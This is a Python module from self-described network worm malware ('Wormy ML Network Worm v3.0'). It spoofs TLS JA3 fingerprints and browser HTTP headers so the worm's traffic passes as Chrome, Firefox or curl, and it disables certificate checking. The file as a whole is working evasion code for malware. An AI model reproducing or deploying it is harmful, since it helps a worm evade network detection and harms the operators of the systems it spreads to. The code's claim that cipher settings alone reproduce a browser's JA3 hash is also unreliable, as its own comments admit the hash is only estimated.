"""
Wormy ML Network Worm v3.0 - JA3 Fingerprint Spoofing
Force the TLS client hello to match known-good browser fingerprints.
"""

import hashlib
import os
import socket
import ssl
import struct
import sys
import urllib.request
from typing import Dict, List, Optional, Tuple

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger

# ── Known JA3 profiles ───────────────────────────────────────────────────────
# JA3 = MD5( SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats )
# We achieve a matching fingerprint by forcing the same cipher suites / extensions.

BROWSER_PROFILES: Dict[str, Dict] = {
    "chrome_120": {
        "description": "Chrome 120 on Windows 10",
        "ja3": "b32309a26951912be7dba376398abc3b",
        # TLS 1.3 + 1.2, ordered cipher list Chrome uses
        "ciphers": (
            "TLS_AES_128_GCM_SHA256:"
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "ECDH+AESGCM:"
            "ECDH+CHACHA20:"
            "DHE+AESGCM:"
            "DHE+CHACHA20:"
            "ECDH+AES128:"
            "DHE+AES128:"
            "ECDH+AES256:"
            "DHE+AES256:"
            "!aNULL:!eNULL:!MD5:!DSS"
        ),
        "tls_version_min": ssl.TLSVersion.TLSv1_2,
        "tls_version_max": ssl.TLSVersion.TLSv1_3,
        "alpn": ["h2", "http/1.1"],
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        "headers": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Upgrade-Insecure-Requests": "1",
        },
    },
    "firefox_121": {
        "description": "Firefox 121 on Windows 10",
        "ja3": "579ccef312d18482fc42e2b822ca2430",
        "ciphers": (
            "TLS_AES_128_GCM_SHA256:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_256_GCM_SHA384:"
            "ECDH+AESGCM:"
            "ECDH+CHACHA20:"
            "DHE+AESGCM:"
            "DHE+CHACHA20:"
            "!aNULL:!eNULL:!MD5"
        ),
        "tls_version_min": ssl.TLSVersion.TLSv1_2,
        "tls_version_max": ssl.TLSVersion.TLSv1_3,
        "alpn": ["h2", "http/1.1"],
        "user_agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) " "Gecko/20100101 Firefox/121.0"
        ),
        "headers": {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        },
    },
    "curl_8": {
        "description": "curl 8.x (generic tool traffic)",
        "ja3": "7dc465ee29f9cce9fda2a2b69a4f7e9a",
        "ciphers": "ECDH+AESGCM:DHE+AESGCM:ECDH+AES128:DHE+AES128:!aNULL:!eNULL",
        "tls_version_min": ssl.TLSVersion.TLSv1_2,
        "tls_version_max": ssl.TLSVersion.TLSv1_3,
        "alpn": ["http/1.1"],
        "user_agent": "curl/8.4.0",
        "headers": {
            "Accept": "*/*",
        },
    },
}


class JA3Spoofer:
    """
    Build a spoofed SSL context + HTTP headers matching a target browser profile.

    Usage:
        spoofer = JA3Spoofer(profile="chrome_120")
        ctx     = spoofer.get_ssl_context()
        headers = spoofer.get_headers(extra={"X-Custom": "value"})
        # Use ctx with urllib / requests / httpx
    """

    def __init__(self, profile: str = "chrome_120"):
        if profile not in BROWSER_PROFILES:
            raise ValueError(
                f"Unknown profile '{profile}'. " f"Available: {list(BROWSER_PROFILES)}"
            )
        self.profile_name = profile
        self.profile = BROWSER_PROFILES[profile]
        logger.info(f"JA3 spoofer: profile={profile} " f"({self.profile['description']})")

    def get_ssl_context(self) -> ssl.SSLContext:
        """
        Return a configured SSLContext that matches the target browser
        cipher suites, TLS versions, and ALPN protocols.
        """
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        # Set TLS version bounds
        ctx.minimum_version = self.profile["tls_version_min"]
        ctx.maximum_version = self.profile["tls_version_max"]

        # Force cipher order
        try:
            ctx.set_ciphers(self.profile["ciphers"])
        except ssl.SSLError as e:
            logger.warning(f"JA3: cipher set error ({e}), using defaults")

        # ALPN (h2, http/1.1)
        try:
            ctx.set_alpn_protocols(self.profile["alpn"])
        except AttributeError:
            pass

        # Disable session tickets / compression to match browser behavior
        ctx.options |= ssl.OP_NO_COMPRESSION
        ctx.options |= ssl.OP_NO_SSLv2
        ctx.options |= ssl.OP_NO_SSLv3

        return ctx

    def get_headers(self, extra: Dict = None) -> Dict[str, str]:
        """
        Return HTTP headers matching the browser profile.
        Merges profile defaults with any extra headers provided.
        """
        headers = {
            "User-Agent": self.profile["user_agent"],
            **self.profile["headers"],
            **(extra or {}),
        }
        return headers

    def make_request(
        self, url: str, method: str = "GET", data: bytes = None, extra_headers: Dict = None
    ) -> Optional[bytes]:
        """
        Execute an HTTP/HTTPS request with the spoofed JA3 fingerprint.
        Returns raw response body or None on failure.
        """
        ctx = self.get_ssl_context()
        headers = self.get_headers(extra_headers)

        try:
            req = urllib.request.Request(url, data=data, method=method, headers=headers)
            handler = urllib.request.HTTPSHandler(context=ctx)
            opener = urllib.request.build_opener(handler)
            with opener.open(req, timeout=15) as resp:
                return resp.read()
        except Exception as e:
            logger.debug(f"JA3 request failed: {e}")
            return None

    @staticmethod
    def compute_ja3(ssl_context: ssl.SSLContext) -> str:
        """
        Approximate JA3 computation from an SSLContext.
        Real JA3 requires capturing the raw ClientHello; this is an estimate
        based on the configured ciphers.
        """
        try:
            ciphers = ssl_context.get_ciphers()
            cipher_ids = [c.get("id", 0) & 0xFFFF for c in ciphers]
            raw = f"771,{'-'.join(str(c) for c in cipher_ids)},,,,"
            return hashlib.md5(raw.encode()).hexdigest()
        except Exception:
            return "unknown"

    def get_status(self) -> Dict:
        return {
            "profile": self.profile_name,
            "description": self.profile["description"],
            "target_ja3": self.profile["ja3"],
            "alpn": self.profile["alpn"],
            "user_agent": self.profile["user_agent"],
        }


def get_spoofer(profile: str = "chrome_120") -> JA3Spoofer:
    """Convenience factory function."""
    return JA3Spoofer(profile)
